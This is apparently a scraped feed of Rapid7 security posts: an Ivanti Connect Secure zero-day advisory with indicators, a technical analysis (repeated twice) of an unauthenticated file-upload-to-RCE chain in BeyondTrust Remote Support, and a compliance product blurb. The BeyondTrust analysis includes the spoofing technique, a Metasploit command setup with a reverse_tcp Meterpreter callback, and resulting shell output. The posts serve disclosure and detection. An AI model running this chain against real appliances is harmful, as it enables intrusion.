items.title: Additional Ivanti Connect Secure zero-days exploited in the wild (CVE-2026-111357, CVE-2026-118527)
items.summary:
Overview

On October 29, 2026, Ivanti updated its security advisory for Ivanti Connect Secure (ICS) to include two additional vulnerabilities and released fixes for both. Ivanti rates CVE-2026-111357, a missing authentication for critical function vulnerability (CWE-306), with a CVSSv3.1 score of 8.8; it allows a local authenticated attacker to escalate privileges. CVE-2026-118527, classified as generation of predictable numbers or identifiers (CWE-340), has an Ivanti-assigned CVSSv3.0 score of 4.3 and, according to CISA's KEV entry, allows a remote authenticated attacker to upload attacker-controlled content to a known location on disk.

Per Ivanti, exploitation in the wild has already occurred prior to disclosure, affecting a limited number of customers when these flaws are chained with CVE-2026-104935, an authentication bypass by spoofing (CWE-290). Rapid7 covered the original disclosure on October 13, 2026, when a fix for CVE-2026-104935 was available but the privilege escalation component remained unpatched. Fixes are now available for all three vulnerabilities.

On October 30, 2026, CVE-2026-111357 and CVE-2026-118527 were added to the U.S. Cybersecurity and Infrastructure Security Agency's (CISA) list of known exploited vulnerabilities (KEV), based on evidence of active exploitation.

The following scores and classifications are from Ivanti's updated advisory:

CVE

Ivanti CVSS score

CWE

Impact

CVE-2026-104935

8.6 (High), CVSSv3.0

CWE-290

Remote unauthenticated command execution

CVE-2026-111357

8.8 (High), CVSSv3.1

CWE-306, CWE-862, CWE-345

Local authenticated privilege escalation

CVE-2026-118527

4.3 (Medium), CVSSv3.0

CWE-340

Remote authenticated file upload to a known path

Note: The CVE record and Rapid7's vulnerability database rate CVE-2026-111357 at 7.0, using high attack complexity and unchanged scope. Ivanti assesses low attack complexity and changed scope, resulting in its score of 8.8. The table follows Ivanti's scores and classifications.

In its investigation, Volexity reports that UTA0576 used an exploit chain to gain unauthenticated root access to an appliance running 22.8R2.4, beginning on October 3, 2026. Its write-up identifies CVE-2026-104935 and CVE-2026-111357; Ivanti's updated advisory identifies CVE-2026-118527 as an additional component of the chain. Volexity observed credential theft and Active Directory queries for Windows LAPS passwords and BitLocker recovery keys.

The combined impact warrants emergency remediation despite the individual CVSS ratings. Ivanti Connect Secure is an enterprise VPN solution deployed at the network edge and has a history of zero-day exploitation, including in 2024 and 2025.

Mitigation guidance

Rapid7 recommends applying the available updates on an emergency basis outside of normal patching cycles. The October 13 fixes in 25.1.1.2 and 22.8R2.5 do not remediate CVE-2026-111357 or CVE-2026-118527.

CVE(s)

Affected versions

Fixed version(s)

CVE-2026-111357 and CVE-2026-118527

25.1.1.2 and prior

25.1.1.3

CVE-2026-111357 and CVE-2026-118527

22.8R2.5 and prior

22.8R2.6

CVE-2026-104935

25.1.1.1 and prior

25.1.1.2

CVE-2026-104935

25.1.2.2 and prior

25.1.3.0, 25.1.3.1

CVE-2026-104935

22.8R2.4 and prior

22.8R2.5

Ivanti recommends moving from 22.8.X to 25.1.1.3 or later, or applying 22.8R2.6 if migration is not immediately possible. Ivanti lists 25.1.3.0 and later on ISA4500, ISA6500, or ISA8500 as unaffected.

Rapid7 also recommends investigating for compromise after patching. Volexity reports that the observed activity evades Ivanti's Integrity Checker Tool, so a clean result does not rule out compromise. Preserve memory and logs before rebooting or resetting where feasible. If compromise is suspected, follow Ivanti's recovery steps and rotate potentially exposed credentials.

For current fixed versions and mitigation guidance, refer to Ivanti's security advisory. Its linked recovery procedure includes older release references.

Artifacts, evidence sources, and IOCs

The following guidance and artifacts are from Volexity's investigation:

Hunting guidance:

  • Review requests to /dana-na/auth/url_default/welcome.cgi, especially URL/header mismatches involving X-DSCGI-PATH. Observed values include:

X-DSCGI-PATH: /home/webserver/htdocs/dana/fb/smb/wu.cgi
X-DSCGI-PATH: /home/runtime/tmp/<MD5(filename)>

Evidence sources on the appliance:

  • /tmp/: ml.py, rq5.py, mk.py, rr.py, pu.txt, sp_out.txt, and spray_hits.json.

  • /data/.icscap/: dsstatmond, cap*, and h.py.

  • /home/runtime/tmp/: ics-root-run-inband-*.pl and ics-root-result-inband-*.

  • /home/runtime/dlogs/debuglog and /var/log/audit/audit.log: investigate evidence of selective deletion.

Network IOCs:

  • 108.165.147[.]64: UTA0576 exploitation IP, per Volexity's IOC list.

Volexity also provides YARA rules for request-header evidence and the privilege escalation payload in memory.

Rapid7 customers

Exposure Command, Vulnerability Management, and Nexpose

Exposure Command, Vulnerability Management, and Nexpose customers can assess exposure to CVE-2026-111357 and CVE-2026-118527 with authenticated vulnerability checks available since the 2026-10-30 content release.

Updates

  • November 2, 2026: Initial publication.

items.title: Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764)
items.summary:
Overview

An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required.

The flaw sits between the internal message router, brain, and an appliance-side customer worker, thin-scc. An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider.

We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets.

We tested Remote Support 24.1.2, build 1524046, revision 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3. The test appliance had public issue-menu session starts and thin chat enabled (default). Other affected releases and fixed builds have not been established. The VM's base appliance version of Secure Remote Access, 7.1.0, is separate from the Remote Support application version. 

Impact

The attacker controls both the contents of an uploaded file and its destination path, subject to the worker's filesystem permissions. The same origin forgery also reaches the file-send operation. We used it to retrieve /proc/self/environ to determine the base installation path of the Remote Support before dropping the payload

On the tested appliance, the native file service could write into the PHP document root. The Metasploit module returns code execution in the context of msfuser, UID 1000, which establishes unauthenticated remote code execution as the site user.

Technical Analysis

We will demonstrate how an attacker can start an anonymous session and then forge a message that the appliance will accept as local. Then outline how we can reach the native file transfer service, choose the uploaded file’s contents and destination and turn the file write into PHP execution.

A network message can claim to be local

Header offset

Field

Value used by the exploit

Source node

The customer's normal node

0x08

Source router

Changed to the reserved value 1

0x0c

Destination node

The worker's node

0x10

Destination router

The worker's router

0x14

Destination handler

Main dispatcher, 2048, on the tested build

0x24

Payload

Service name, newline, then packed fields

From file upload to PHP execution

The next step is to choose a writable location that the web server would execute. The supplied config/apache_vhost.conf sets the document root to:

/home/msfuser/ingredi-24.1.2/app/www/public

An absolute upload into that directory succeeded. There is a small catch when requesting the file: a URL ending in .php returns 404, even while the file existed. app/www/public/.htaccess explains why. 

source/app/www/public/.htaccess:

# ... omitted: application routes and compatibility rewrites ...
RewriteCond %{THE_REQUEST} "^[^ ]* .*?\.php[?/ ].*$"
# [I1] Direct .php URLs return 404.
RewriteRule .* - [L,R=404]

# ... omitted: download-helper routes ...
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}\.php -f
# [I2] An extensionless URL executes the existing PHP file.
RewriteRule ^(.+)$ $1.php [L]

The rule at [I1] rejects a direct .php request. The rule at [I2] maps an extensionless URL to an existing PHP file.

Requesting the uploaded basename without .php executed our payload. It returned its absolute filename, EUID 1000, and the output of id. 

We also wanted to avoid guessing Remote Support’s working directory or the versioned installation name. The same native service can send us the worker's /proc/self/environ using UploadFiles. On this appliance, it contains:

BG_app_root=/home/msfuser/ingredi-24.1.2
BRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock

BG_app_root gives us the installation directory directly. Appending /app/www/public gives the upload destination; the socket path provides another way to identify the same root. There is one protocol wrinkle: procfs reports the environment file's size as zero, but the worker still streams its contents. We have to read through the data stream's EOF instead of stopping at the advertised size. 

Exploit

The Metasploit module carries out the chain using two fresh public customer sessions. It discovers the thin worker through Director.GetGatewaySessionValues for its own thin guest, sends the forged LocalFileTransfer request to the worker's main dispatcher, and serves the PHP bytes over its existing MRS connection. A separate upload server is not needed.

The module writes a random PHP filename into the site's public directory, then POSTs an execution token to the extensionless URL. The PHP file checks that token and unlinks itself before executing the payload. Target 0 runs a PHP payload; target 1 wraps a Unix command in PHP.

For a PHP Meterpreter payload, the basic configuration is:

use exploit/linux/http/beyondtrust_rs_mrs_file_upload
set RHOSTS 192.168.1.98
set TARGET 0
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.68
run verbose=true

Select target 0 and a compatible command payload, such as php/meterpreter/reverse_tcp. The module documentation covers the directory override and other options.

The URL may not contain .php

The earlier PHP canary produced these lines:

192.168.1.68 [28/Oct/2026:20:50:07 +0000] "GET /msfcanary03d80193f0880b.php HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]
192.168.1.68 [28/Oct/2026:20:50:35 +0000] "GET /msfcanary03d80193f0880b HTTP/1.1" [0s] [Stat:200] [Size:368] [Ref:-] [UA:Python-urllib/3.9]
192.168.1.68 [28/Oct/2026:20:50:35 +0000] "GET /msfcanary03d80193f0880b HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]

The direct .php request failed, while the extensionless request executed the same file. The final 404 followed self-deletion. Detection that only searches for requests ending in .php would miss the successful request in this example.

The native transfer itself travels inside the customer MRS connection. These access-log entries show the HTTP trigger, not the file contents or the forged router ID. The captured HTTP log does not expose the inner MRS messages, so it cannot establish the origin bypass on its own.

Files and connections

Look for unexpected PHP files under the site's public directory and receive files ending in .php.n$t. An interrupted transfer may leave the temporary file even if the final URL returns 404. The .n$t suffix also belongs to the normal transfer implementation, so its presence needs context.

Native file-transfer traces

thin-scc.log and thin-scc-errors.log contain more direct evidence of the file-service requests. For example, this line from thin-scc-errors.log names the action, native provider, and intended PHP destination. Only ckey and downloadToken have been redacted:

20261029 17:01:33 999999 thin-scc 11801:proc{LocalFileTransfer}(t11832) FT:WARNING>DISCARDING NONLOCAL MESSAGE: LocalFileTransfer:action=DownloadAnonymousFiles;ckey=<REDACTED>;downloadToken=<REDACTED>;enableResume=0;ftsName=local;path=/home/msfuser/ingredi-24.1.2/app/www/public/envresolve28f788af6a1c39bf.php;serverAddress=1:1022182175:9000;wantOverwritePrompts=0

This was our negative control: the request used the customer's ordinary source address and was rejected. It is evidence of an attempted invocation, not a successful upload. The forged local source passes the check that produces this warning, so a successful exploit need not leave a DISCARDING NONLOCAL MESSAGE entry.

The successful PHP module run left these lines in thin-scc.log:

20261029 17:06:37    319 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_STREAM:INFO>createStream: connecting to address 1:1129726787:1031
20261029 17:06:37      2 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_CL:ERROR>nodeID not found in node list even after renumerating: 0
20261029 17:06:37      0 thin-scc 14419:proc{LocalFileTransfer}(t14486) MSG_DSP:ERROR>failed to create a mailbox for sending to: 0:0:0

Our requests omit responseAddress. The handler starts the transfer, then tries to send its action response to an empty address. That produces the 0:0:0 error without preventing the file write. The payload callback independently confirms execution at 17:06:37.

Look for this combination in the proc{LocalFileTransfer} context, especially around unfamiliar PHP requests or outbound connections. The 1:1129726787:1031 value identifies an internal MRS mailbox; use the brain connection records below for the client IP. These entries do not identify the written filename or prove execution on their own. The empty-address errors also depend on how the exploit request is constructed; another implementation may leave different traces.

Brain connection records

brain.log helps link the activity to a client address. These two entries preceded the same module run:

20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0'
20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1'

These are useful for a timeline, but customer connections are normal activity. We found no UploadFiles or DownloadAnonymousFiles action records in the captured brain logs. Generic EOF, connection-reset, and conference errors also appeared; they are too broad to treat as exploit indicators by themselves.

Where to collect the native logs

The aggregated logs are under $BG_app_root/log/. While a worker is running, its own logs are under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/. The wrapper appends those logs to the site's log directory when the worker exits, then clears the per-worker copies. Collect both locations when investigating a live session.

The captured brain.ini and thin-scc.ini both had the debug output disabled with enabled=0. No debug log was captured, and we did not change the logging configuration. Brain's debug configuration also limits MRS_* categories to Info, so enabling its debug output alone would not guarantee detailed message payloads.

Names such as UploadFileStarted and DownloadFileEnded occur in the native protocol's callback code, but we did not find them in the collected logs. They should not be presented as default audit events

raw.title: Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764)
raw.summary:
Overview

An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required.

The flaw sits between the internal message router, brain, and an appliance-side customer worker, thin-scc. An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider.

We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets.

We tested Remote Support 24.1.2, build 1524046, revision 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3. The test appliance had public issue-menu session starts and thin chat enabled (default). Other affected releases and fixed builds have not been established. The VM's base appliance version of Secure Remote Access, 7.1.0, is separate from the Remote Support application version. 

Impact

The attacker controls both the contents of an uploaded file and its destination path, subject to the worker's filesystem permissions. The same origin forgery also reaches the file-send operation. We used it to retrieve /proc/self/environ to determine the base installation path of the Remote Support before dropping the payload

On the tested appliance, the native file service could write into the PHP document root. The Metasploit module returns code execution in the context of msfuser, UID 1000, which establishes unauthenticated remote code execution as the site user.

Technical Analysis

We will demonstrate how an attacker can start an anonymous session and then forge a message that the appliance will accept as local. Then outline how we can reach the native file transfer service, choose the uploaded file’s contents and destination and turn the file write into PHP execution.

Addresses use Ghidra image base 0x100000. Subtract that value for the raw ELF virtual address. Function names beginning with FUN_ are Ghidra labels; descriptive names are taken from diagnostic strings where available.

Starting an anonymous customer session

We begin by obtaining two customer keys from POST /api/start_session. These are fresh public guest sessions. The keys let the client use the customer transport, but do not identify a logged-in account. Each guest connects through the /nw WebSocket endpoint, using either the native or thin customer protocol.

source/app/write_app_chooser_config:

echo "ingredi support desk customer:|$BG_app_root/data/tmp/brain.sock" # [A1]
echo "ingredi support desk customer thin:$BG_app_root/app/thin-scc-wrapper" # [A2]

app/write_app_chooser_config shows where the two customer protocols go. The native protocol reaches the brain socket at [A1]; the thin protocol launches a wrapper at [A2].

source/app/thin-scc-wrapper:

# ... omitted: protocol parsing and the alternative debug-site branch ...

quoted=$(export PHPRC="$BG_app_root/config/php-cli.ini"; echo $gskey | $ingrediRoot/app/dbquote)
if [[ $(echo "SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())" | $db) != "1" ]]; then # [A3]
    echo "1 failure" >&0
    exit 0
fi

# ... omitted: reconnect throttling, customer-name setup, and settings generation ...

app/thin-scc-wrapper checks that the thin customer's key belongs to an unexpired sdcust session at [A3]. A key obtained through the public session-start endpoint passes this check.

app/thin-scc-wrapper, after the session check:

echo "0 success" >&0
workDir=`handleThinMint "$thinMint"` || exit

if [[ ! -f "$workDir/thin-scc" ]]; then
    pushd "$workDir"
    cp $ingrediRoot/app/thin-scc .
    # ... omitted: license, image, and settings.ini setup ...
else
    pushd "$workDir"
fi

export BRAIN_MELD_SOCKET_PATH=$ingrediRoot/data/tmp/brain.sock
# ... omitted: server-side environment initialization ...
./thin-scc # [A4] Starts the worker inside the appliance environment.
exitStatus=$?

The same wrapper then prepares a working directory and starts thin-scc at [A4]. This process runs on the appliance, even though it is handling an anonymous customer's thin session.

The native connection gives us a client for the internal message-routing system, referred to here as MRS. The thin connection gives us an appliance-side worker to address. Neither step requires a representative to accept the session.

A network message can claim to be local

MRS addresses have three parts: node:router:handler. Each message carries source and destination addresses in a 36-byte header made up of nine little-endian 32-bit fields.

Header offset

Field

Value used by the exploit

0x04

Source node

The customer's normal node

0x08

Source router

Changed to the reserved value 1

0x0c

Destination node

The worker's node

0x10

Destination router

The worker's router

0x14

Destination handler

Main dispatcher, 2048, on the tested build

0x24

Payload

Service name, newline, then packed fields

app/brain — ingress check:

if (*(int *)((long)param_2 + 0xc) == *(int *)(param_1 + 0x10)) {
    *(uint *)(param_2 + 4) = (uint)*(byte *)(param_2 + 4);

    if ((*(int *)(param_2 + 1) == *(int *)((long)param_1 + 0x84)) &&
        (param_3 != (ulong **)0x0)) { // [B1] Rejects a network claim of this router's actual ID.
        if (lRam0000000001ec8610 != 0) {
            func_0x0168de00(
                0x15, 3,
                "dropping spoofed message that came in from the network but has a routerID of our own\n"

        }
    }
    else if (*(int *)((long)param_1 + 0x84) == *(int *)(param_2 + 2)) {
        // ... omitted: delivery to a handler on this router ...
    }
    else {
        // ... omitted: TTL checks, route lookup, and forwarding branches ...
    }
}

app/brain has an anti-spoofing check in FUN_01566ae0, identified by its handleMessageFromOtherRouter diagnostic. At [B1], it rejects a network packet whose source router matches the receiving router's actual ID.

Here, param_1 is the receiving router, param_2 is the packet, and param_3 is the incoming connection. Because param_2 points to eight-byte elements, *(int *)(param_2 + 1) reads the source router at byte offset 0x08.

That leaves a gap: the check compares against the actual router ID, while downstream code also recognises a reserved local alias. On this appliance, the alias is 1.

// ... omitted: destination route resolution, loop checks, and diagnostic logging ...
FUN_0155ec40(
    ppuStack_1300,
    ppuVar6,
    param_2, // [B2] Forwards the packet carrying the caller-supplied source router.
    (int *)((long)param_2 + 0x24)
);

The forwarding path in the same app/brain function passes the packet onward at [B2]. It does not remove the source claim that matters to the worker's local-origin check.

app/brain — local-address predicate:

bool FUN_0155ad40(long param_1, int *param_2)
{

    bVar1 = false;
    if (*param_2 == *(int *)(param_1 + 0x80)) { // [C1] Address node must match the local node.
        bVar1 = true;
        if (param_2[1] != 1) { // [C2] Router 1 returns true without the actual-ID comparison.

The rule is effectively node AND (router == 1 OR router == actual local router). An address supplied by a network client is being used to make that decision.

app/thin-scc — message-origin wrapper:

(*UNRECOVERED_JUMPTABLE)(

    param_1 + 0xb, // [C3] Uses the dispatched message's sender address at byte offset 0x58.
    UNRECOVERED_JUMPTABLE

The corresponding message wrapper in app/thin-scc, passes the message's sender address into its router object's local-address predicate at [C3]. Ghidra did not recover a reliable prototype for this indirect call; the caller consumes its result as a boolean.

We checked this behaviour with the same file-service request under two origins. The ordinary customer source produced no file-service connection during a two-second observation. Changing the source router to 1 caused the worker to accept it.

Reaching the native file-transfer service

In app/thin-scc, FUN_0047a850 dispatches file-transfer messages.

On completion, the receiver closes the file and, when a temporary path is used, renames it to the final destination. The service already accepts an absolute destination path, so no directory traversal is needed. The worker allows the request because it trusts the forged local source address.

From file upload to PHP execution

The next step is to choose a writable location that the web server would execute. The supplied config/apache_vhost.conf sets the document root to:

An absolute upload into that directory succeeded. There is a small catch when requesting the file: a URL ending in .php returns 404, even while the file existed. app/www/public/.htaccess explains why.

# ... omitted: download-helper routes ...
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}\.php -f
# [I2] An extensionless URL executes the existing PHP file.
RewriteRule ^(.+)$ $1.php [L]

The rule at [I1] rejects a direct .php request. The rule at [I2] maps an extensionless URL to an existing PHP file.

Requesting the uploaded basename without .php executed our payload. It returned its absolute filename, EUID 1000, and the output of id. 

We also wanted to avoid guessing Remote Support’s working directory or the versioned installation name. The same native service can send us the worker's /proc/self/environ using UploadFiles. On this appliance, it contains:

BG_app_root=/home/msfuser/ingredi-24.1.2
BRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock

BG_app_root gives us the installation directory directly. Appending /app/www/public gives the upload destination; the socket path provides another way to identify the same root. There is one protocol wrinkle: procfs reports the environment file's size as zero, but the worker still streams its contents. We have to read through the data stream's EOF instead of stopping at the advertised size. 

Exploit

The Metasploit module carries out the chain using two fresh public customer sessions. It discovers the thin worker through Director.GetGatewaySessionValues for its own thin guest, sends the forged LocalFileTransfer request to the worker's main dispatcher, and serves the PHP bytes over its existing MRS connection. A separate upload server is not needed.

The module writes a random PHP filename into the site's public directory, then POSTs an execution token to the extensionless URL. The PHP file checks that token and unlinks itself before executing the payload. Target 0 runs a PHP payload; target 1 wraps a Unix command in PHP.

For a PHP Meterpreter payload, the basic configuration is:

use exploit/linux/http/beyondtrust_rs_mrs_file_upload
set RHOSTS 192.168.1.98
set TARGET 0
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.68
run verbose=true

Select target 0 and a compatible command payload, such as php/meterpreter/reverse_tcp. The module documentation covers the directory override and other options.

Figure 1: Exploiting the anonymous file-transfer service with Metasploit.

Testing produced two PHP Meterpreter sessions, a command-wrapped PHP Meterpreter session, and a Bash shell. Both targets also ran with AutoCheck disabled, and immediate repeat exploitation succeeded. The Bash shell returned:

uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),16(cron),70(postgres)

IOCs

The excerpts below cover HTTP requests, native file-transfer activity in thin-scc, and customer connections recorded by brain. They come from our lab runs on 28–29 October 2026. Original timestamps, addresses, and paths are retained; session and transfer tokens are redacted where noted. Unrelated entries are omitted.

The site logs are stored under $BG_app_root/log/, where BG_app_root identifies the Remote Support installation directory:

Log

Evidence shown below

httpd_access.log

Public session creation and requests to uploaded PHP endpoints

thin-scc.log

Native file-transfer stream creation and routing errors

thin-scc-errors.log

Rejected file-transfer requests, including the action and destination path

brain.log

Customer connection records with client addresses and timestamps

Active workers also keep logs under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/; the collection details below explain how these reach the site log directory. The installation path varies between appliances.

Requests to an uploaded PHP endpoint

The command-only Metasploit run created two public customer sessions, invoked its uploaded PHP endpoint, and then checked that the endpoint had gone. The relevant access-log lines are:

192.168.1.68 [28/Oct/2026:21:12:23 +0000] "POST /api/start_session HTTP/1.1" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]
192.168.1.68 [28/Oct/2026:21:12:23 +0000] "POST /api/start_session HTTP/1.1" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]
192.168.1.68 [28/Oct/2026:21:12:31 +0000] "POST /qdgusthrmlirprls HTTP/1.1" [0s] [Stat:200] [Size:0] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]
192.168.1.68 [28/Oct/2026:21:12:38 +0000] "POST /qdgusthrmlirprls HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0]
192.168.1.68 [28/Oct/2026:21:12:43 +0000] "GET /qdgusthrmlirprls HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]

Here, /qdgusthrmlirprls mapped to qdgusthrmlirprls.php in the public directory. The first POST ran the command and returned 200. The later POST was the module's cleanup request; the GET independently checked the endpoint. Both received 404 after the file had deleted itself.

This gives defenders a sequence to investigate: public session creation followed by a request to a new, unfamiliar endpoint, potentially followed by 404s for the same path. Session creation alone is normal Remote Support activity. A 200 followed by a 404 is also insufficient by itself; correlate the requests with file changes, session records, and any unusual outbound connections.

The URL may not contain .php

The earlier PHP canary produced these lines:

192.168.1.68 [28/Oct/2026:20:50:07 +0000] "GET /msfcanary03d80193f0880b.php HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]
192.168.1.68 [28/Oct/2026:20:50:35 +0000] "GET /msfcanary03d80193f0880b HTTP/1.1" [0s] [Stat:200] [Size:368] [Ref:-] [UA:Python-urllib/3.9]
192.168.1.68 [28/Oct/2026:20:50:35 +0000] "GET /msfcanary03d80193f0880b HTTP/1.1" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]

The direct .php request failed, while the extensionless request executed the same file. The final 404 followed self-deletion. Detection that only searches for requests ending in .php would miss the successful request in this example.

The native transfer itself travels inside the customer MRS connection. These access-log entries show the HTTP trigger, not the file contents or the forged router ID. The captured HTTP log does not expose the inner MRS messages, so it cannot establish the origin bypass on its own.

Files and connections

Look for unexpected PHP files under the site's public directory and receive files ending in .php.n$t. An interrupted transfer may leave the temporary file even if the final URL returns 404. The .n$t suffix also belongs to the normal transfer implementation, so its presence needs context.

Native file-transfer traces

thin-scc.log and thin-scc-errors.log contain more direct evidence of the file-service requests. For example, this line from thin-scc-errors.log names the action, native provider, and intended PHP destination. Only ckey and downloadToken have been redacted:

20261029 17:01:33 999999 thin-scc 11801:proc{LocalFileTransfer}(t11832) FT:WARNING>DISCARDING NONLOCAL MESSAGE: LocalFileTransfer:action=DownloadAnonymousFiles;ckey=<REDACTED>;downloadToken=<REDACTED>;enableResume=0;ftsName=local;path=/home/msfuser/ingredi-24.1.2/app/www/public/envresolve28f788af6a1c39bf.php;serverAddress=1:1022182175:9000;wantOverwritePrompts=0

This was our negative control: the request used the customer's ordinary source address and was rejected. It is evidence of an attempted invocation, not a successful upload. The forged local source passes the check that produces this warning, so a successful exploit need not leave a DISCARDING NONLOCAL MESSAGE entry.

The successful PHP module run left these lines in thin-scc.log:

20261029 17:06:37    319 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_STREAM:INFO>createStream: connecting to address 1:1129726787:1031
20261029 17:06:37      2 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_CL:ERROR>nodeID not found in node list even after renumerating: 0
20261029 17:06:37      0 thin-scc 14419:proc{LocalFileTransfer}(t14486) MSG_DSP:ERROR>failed to create a mailbox for sending to: 0:0:0

Our requests omit responseAddress. The handler starts the transfer, then tries to send its action response to an empty address. That produces the 0:0:0 error without preventing the file write. The payload callback independently confirms execution at 17:06:37.

Look for this combination in the proc{LocalFileTransfer} context, especially around unfamiliar PHP requests or outbound connections. The 1:1129726787:1031 value identifies an internal MRS mailbox; use the brain connection records below for the client IP. These entries do not identify the written filename or prove execution on their own. The empty-address errors also depend on how the exploit request is constructed; another implementation may leave different traces.

Brain connection records

brain.log helps link the activity to a client address. These two entries preceded the same module run:

20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0'
20261029 17:06:30      0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1'

These are useful for a timeline, but customer connections are normal activity. We found no UploadFiles or DownloadAnonymousFiles action records in the captured brain logs. Generic EOF, connection-reset, and conference errors also appeared; they are too broad to treat as exploit indicators by themselves.

Where to collect the native logs

The aggregated logs are under $BG_app_root/log/. While a worker is running, its own logs are under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/. The wrapper appends those logs to the site's log directory when the worker exits, then clears the per-worker copies. Collect both locations when investigating a live session.

The captured brain.ini and thin-scc.ini both had the debug output disabled with enabled=0. No debug log was captured, and we did not change the logging configuration. Brain's debug configuration also limits MRS_* categories to Info, so enabling its debug output alone would not guarantee detailed message payloads.

Names such as UploadFileStarted and DownloadFileEnded occur in the native protocol's callback code, but we did not find them in the collected logs. They should not be presented as default audit events

items.title: How Rapid7 InsightGovCloud Supports BOD 22-01 Compliance
items.summary:
An introduction to CISA’s BOD 22-01

Issued nearly four years ago, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) Binding Operational Directive 22-01 (BOD 22-01) has been adopted across both public and private sector organizations as a framework to ensure timely remediation of vulnerabilities being exploited by adversaries. By establishing a catalog of known exploited vulnerabilities (KEVs) and emphasizing a risk-based, prioritized approach, it provides a clear model for organizations to strengthen their cybersecurity posture and reduce exposure to real-world threats.

InsightGovCloud, Rapid7’s FedRAMP-authorized suite of security solutions, helps organizations implement BOD 22-01 by providing automated vulnerability scanning, real-time alerts for KEVs, and reporting aligned with regulatory requirements. Public and private sector teams can quickly identify at-risk assets, prioritize remediation efforts based on active exploitation, and maintain an auditable record of compliance. By leveraging our secure, cloud-based platform, organizations gain continuous visibility, streamlined vulnerability management, and the confidence that remediation aligns with federal cybersecurity standards.

How InsightGovCloud stacks up against key BOD 22-01 requirements

Requirement 1: Maintain continuous inventory and visibility

  • InsightVM, included in the suite, supports continuous and automated discovery of both external and internal assets through Discovery Connections, which allow organizations to continuously poll network sources like Active Directory, AWS, and Azure to enumerate connected hosts and launch scans. 

  • For cloud environments, Rapid7 InsightCloudSec will continuously inventory the entire environment for the creation of new resources and automatically scan and assess those resources against compliance frameworks.

  • Rapid7 also maintains up-to-date inventory of CISA KEVs with an industry leading 90% coverage for both on-premise and cloud based host vulnerabilities.

Requirement 2: Remediate CISA KEV findings on a prioritized schedule

  • Continuous ingestion of CISA KEV catalog by Rapid7 ensures that detection and prioritization of KEV’s can be streamlined and native to one platform.

  • Automatically detect and triage assets with KEVs across cloud and hybrid environments.

  • Prioritize CISA KEV’s across your entire environment and establish remediation projects to quickly and collaboratively remediate KEVs.

Requirement 3: Establish policies and enforcement

  • Collaborative remediation and compliance goals automatically track and assign vulnerabilities to the right teams with organizational defined timelines and real time dashboards to measure progress.

Requirement 4: Automate reporting

